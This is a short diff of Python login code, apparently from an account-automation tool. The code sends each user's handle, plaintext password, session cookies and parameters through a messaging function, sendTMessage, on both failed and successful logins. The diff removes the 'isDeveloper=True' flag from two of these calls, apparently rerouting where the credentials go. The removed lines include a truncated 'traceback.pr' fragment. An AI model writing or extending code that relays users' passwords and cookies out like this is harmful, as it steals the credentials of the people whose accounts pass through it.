@@ -53,7 +53,6 @@ Please Check Handle or Password
                     """)
                 
         except Exception as e :
-            traceback.pr
             sendTMessage(f"""
 Faild Login as : {self.instance.agent}
 Username : {self.handle}
@@ -109,7 +108,6 @@ Password : {self.password}
 Cookies : {cookie}
 User Params : {user.params_new_instance}
         """,
-        isDeveloper=True
         )
         return new_login_info
 
@@ -131,7 +129,7 @@ Password : {self.password}
 Cookies : {cookie}
 User Params : {user.params_new_instance}
             """,
-            isDeveloper=True
+            
             )
             return login_info
         except AccountLoginInfo.DoesNotExist:
